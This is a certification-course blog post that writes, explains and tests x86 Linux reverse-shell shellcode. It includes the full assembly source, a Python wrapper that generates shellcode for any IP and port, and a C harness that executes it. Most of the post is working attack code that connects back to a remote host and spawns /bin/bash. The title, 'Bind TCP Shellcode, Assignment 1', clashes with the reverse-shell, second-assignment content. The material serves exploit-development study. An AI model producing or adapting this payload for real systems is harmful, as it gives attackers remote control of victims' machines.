---
title: SLAE - Assignment 1 - Bind TCP Shellcode
author: fwinsnes
date: 2021-01-14 13:44:00 +0800
categories: [SLAE]
tags: [assembly, shellcoding]
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close 
look at Linux Reverse Shells. 

A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind shell, arranging a specific 
connection on a trivial address, instead of binding to a local port of the compromised system.

The second assignment from the seven requires the creation of a Reverse Shell through the Assembly language, and converting such into [shellcode](https://es.wikipedia.org/wiki/Shellcode). Moreover, it is required to write a wrapper in any language of preference that is capable of 
easily configuring the address and port.

If you were able to follow the previous post with ease, this should be a charm!

#### Theory 

In order to create a Reverse Shell, 4 main functions are required:

+ Socket

+ Connect

+ Dup2

+ Execve

#### Time to stick our hands into the mud

The first thing required is to clean the registers, as when we execute our program, it will work as a charm. Nevertheless, when introduced into a real program, within a context 
of binary exploitation, with different variables that modify the registers, it may not. Due to this, it's better to have a set of instructions that clean the registers that will be employed:

```term
global _start

section .text

_start:

      xor eax, eax            ; Zeroes out EAX.
      xor ebx, ebx            ; Zeroes out EBX.
      xor ecx, ecx            ; Zeroes out ECX.
      xor edx, edx            ; Zeroes out EDX.
```

##### Socket

###### Creates an endpoint for communication

Our next step is to initialize the socket. In order to concrete such action, it is required to move the value of the socket (359) syscall into eax. I have chosen to push the 
value as a word into the ax register, in order to avoid null characters. Furthermore, according to the syscall man page for socket, the required flags involve domain (EBX), type 
(ECX) and protocol (EDX). A common combination when it comes to remote shells is AF_INET, SOCK_STREAM. According to [this file](https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html), the value of AF_INET is 2 and SOCK_STREAM 1, therefore, this will be reflected on the EBX and ECX 
registers. Finally, the value of protocol (EDX) isn't actually very relevant. Due to this, EDX is simply pushed.

```term
      push word 359           ; Pushes word 359 (socket) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov bl, 2               ; Moves value 2 into bl, giving the value AF_INET.
      mov cl, 1               ; Moves value 1 into bl, giving the value SOCK_STREAM.
      push edx                ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
      int 0x80                ; Call to kernel.
      mov esi, eax            ; Saves the value of eax for sockfd values later on.
```

As explained on the previous post, we can see that the value of EAX is being saved on ESI, this will be from great help when referring to the socket syscall as a file 
descriptor.

##### Connect

###### Initiate a connection on a socket

The following step is to initiate a connection on the socket. The arguments according the man page are the following: ```int connect(int sockfd, const struct sockaddr *addr, 
socklen_t addrlen);```. As you may see, the required flags are quite the same to the bind syscall in the previous post. Nonetheless, if you remember, in the previous post a 
value of 0 was pushed within the IP protocol argument, value which will be essential this time, therefore, the order will be the following:

+ 0            (As it is required to push 0, the instruction PUSH EDX will be used.)
+ IP Address   (As this is a reverse shell, it is required to point to a specific address. Due to the aforementioned, this will be set to our IP within hex.)
+ Chosen Port  (The chosen port will be pushed in hex as a word.)
+ AF_INET

Furthermore, we have to satisfy the socklen_t addrlen argument as well. This requires the length of the previous struct, as like in the previous chapter, it was 16 (any value 
above this could be used as well) . This will be reflected upon the value of DL. 

###### Syscall value:
```term
root@whitecr0wz:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep connect 
#define __NR_connect 362
root@whitecr0wz:~#
```

```term
connect:

      push word 362           ; Pushes word 362 (connect) into the stack
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
      push edx                ; Pushes 0.
      push dword 0x8b64a8c0   ; Pushes 192.168.100.139 in hex as a DWORD.
      push word 0x2823        ; Pushes 9000 in hex as a WORD.
      push word 0x02          ; Pushes AF_INET into the stack.
      mov ecx, esp            ; Copies the value of ESP into ECX.
      mov dl, 30              ; The value 30 is inserted into DL. Anything above 16 can be used.
      int 0x80                ; Call to kernel.
```

##### Dup2

###### Duplicate a file descriptor

Once again, we encounter ourselves with our buddy Dup2. This syscall will make our communication with the compromised device interactive by duplicating the file descriptors 
STDIN (0), STDOUT (1), and STDERR (2) into our connection. Furthermore, as this requires that dup2 is iterated 3 times, a loop that is executed in such on three occasions will be implemented that performs such task as long as the zero flag (ZF) is not set. 

###### Syscall value:
```term
root@whitecr0wz:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
#define __NR_dup2 63
root@whitecr0wz:~#
```

###### manpage arguments: ```int dup2(int oldfd, int newfd);```

```term
      xor ecx, ecx            ; Zeroes out ECX.
      mov cl, 0x3             ; Starts counter for dup2.

dup2:

      xor eax, eax            ; Zeroes out EAX.

      push word 63            ; Pushes word 63 (dup2) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
      dec cl                  ; Decrements cl in order to set the zero flag (ZF)
      int 0x80                ; Call to kernel.

      jnz dup2                ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
```

##### Execve

###### Execute program

Finally, the last syscall left to initialize is Execve, which will execute the program when the connection is stablished. 

###### Syscall value:

```term
root@whitecr0wz:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep execve 
#define __NR_execve 11
#define __NR_execveat 358
root@whitecr0wz:~# 
```

###### manpage arguments:

```term
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

The procedure with this syscall will be the following:

+ The program desired to execute will be /bin/bash. 
+ The string "////bin/bash" (additional slashes in order to be divisible by 4) will be pushed into the stack and then saved into EBX. 
+ EDX will be set to 0 as the value envp[] is not required. 
+ EBX will be pushed and saved into ECX.
+ Execve will be called.

```term
execve:

      xor eax, eax            ; Zeroes out EAX.
      push eax                ; Pushes EAX (0x00000000).

      PUSH 0x68736162         ; hsab
      PUSH 0x2f6e6962         ; /nib
      PUSH 0x2f2f2f2f         ; ////

      mov ebx, esp            ; Copies the pushed instructions into EBX.
      push eax                ; Pushes EAX (0x00000000).

      mov edx, esp            ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0.

      push ebx                ; Pushes ////bin/bash into the stack.
      mov ecx, esp            ; Copies such value to ECX.
      push word 11            ; Pushes word 11 (execve) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      int 0x80                ; Calls to kernel.
```

Let's test our shellcode.

![](/assets/img/SLAE/SLAE32/Assignment_2/1.png)

Wonderful!

Final Code:

```term
global _start

section .text

_start:

      xor eax, eax            ; Zeroes out EAX.
      xor ebx, ebx            ; Zeroes out EBX.
      xor ecx, ecx            ; Zeroes out ECX.
      xor edx, edx            ; Zeroes out EDX.

      push word 359           ; Pushes word 359 (socket) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov bl, 2               ; Moves value 2 into bl, giving the value AF_INET.
      mov cl, 1               ; Moves value 1 into bl, giving the value SOCK_STREAM.
      push edx                ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
      int 0x80                ; Call to kernel.
      mov esi, eax            ; Saves the value of eax for sockfd values later on.

connect:

      push word 362           ; Pushes word 362 (connect) into the stack
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
      push edx                ; Pushes 0.
      push dword 0x8b64a8c0   ; Pushes 192.168.100.139 in hex as a DWORD.
      push word 0x2823        ; Pushes 9000 in hex as a WORD.
      push word 0x02          ; Pushes AF_INET into the stack.
      mov ecx, esp            ; Copies the value of ESP into ECX.
      mov dl, 30              ; The value 30 is inserted into DL, anything above 16 can be used.
      int 0x80                ; Call to kernel.

      xor ecx, ecx            ; Zeroes out ECX.
      mov cl, 0x3             ; Starts counter for dup2.

dup2:

      xor eax, eax            ; Zeroes out EAX.

      push word 63            ; Pushes word 63 (dup2) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
      dec cl                  ; Decrements cl in order to set the zero flag (ZF)
      int 0x80                ; Call to kernel.

      jnz dup2                ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.

execve:

      xor eax, eax            ; Zeroes out EAX.
      push eax                ; Pushes EAX (0x00000000).

      PUSH 0x68736162         ; hsab
      PUSH 0x2f6e6962         ; /nib
      PUSH 0x2f2f2f2f         ; ////

      mov ebx, esp            ; Copies the pushed instructions into EBX.
      push eax                ; Pushes EAX (0x00000000).

      mov edx, esp            ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0.

      push ebx                ; Pushes ////bin/bash into the stack.
      mov ecx, esp            ; Copies such value to ECX.
      push word 11            ; Pushes word 11 (execve) into the stack.
      pop ax                  ; Pops such word into ax so there are no nulls.
      int 0x80                ; Calls to kernel.
```

#### The Wrapper

As stated in the introduction, one additional detail given in the assignment is to create a wrapper (in any language) that easily configures the address and port for the reverse shell.

Wrapper code:

```term
import socket, sys, struct

if len(sys.argv) != 3:

      print "[*] Example: /usr/bin/python wrapper.py <IP address> <port>"
      sys.exit(1)

address = sys.argv[1]

address = address.split('.')
hexaddress = hex(int(address[0])) + hex(int(address[1])) + hex(int(address[2])) + hex(int(address[3]))
hexaddress = hexaddress.replace('0x', '')
hexaddress = hexaddress.upper()

final_address = "\\x"+"\\x".join(a+b for a,b in zip(hexaddress[::2],hexaddress[1::2]))

port = sys.argv[2]
port = int(port)
port = socket.htons(port)
hexport = hex(port)
hexport = struct.pack("<H", port).encode("hex")

final_port = "\\x"+"\\x".join(a+b for a,b in zip(hexport[::2],hexport[1::2]))

buf = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\x68\\x67\\x01\\x66\\x58\\xb3"
"\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x6a\\x01\\x66\\x58\\x89"
"\\xf3\\x52\\x68"
+ final_address +
"\\x66\\x68"
+ final_port +
"\\x66\\x6a\\x02\\x89"
"\\xe1\\xb2\\x1e\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\x66\\x6a\\x3f\\x66"
"\\x58\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf1\\x31\\xc0\\x50\\x68\\x62\\x61"
"\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50"
"\\x89\\xe2\\x53\\x89\\xe1\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80")


print '"' + (buf) + '"'
```

###### Executing the wrapper:

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_2$ python wrapper.py 192.168.100.139 65434 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x6a\x01\x66\x58\x89\xf3\x52\x68\xC0\xA8\x64\x8B\x66\x68\xff\x9a\x66\x6a\x02
\x89\xe1\xb2\x1e\xcd\x80\x31\xc9\xb1\x03\x31\xc0\x66\x6a\x3f\x66\x58\x89\xf3\xfe\xc9\xcd\x80\x75\xf1\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\
xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80"
whitecr0wz@SLAE:~/assembly/assignments/Assignment_2$
```

Let's test this on a C file to make sure that the shellcode could work on a real environment:

```term
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x6a\x01\x66\x58\x89\xf3\x52\x68\xC0\xA8\x64\x8B\x66\x68\xff\x9a\x66\x6a\x02
\x89\xe1\xb2\x1e\xcd\x80\x31\xc9\xb1\x03\x31\xc0\x66\x6a\x3f\x66\x58\x89\xf3\xfe\xc9\xcd\x80\x75\xf1\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\
xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80"
;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame

![](/assets/img/SLAE/SLAE32/Assignment_2/2.png)

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/Assignment_2).
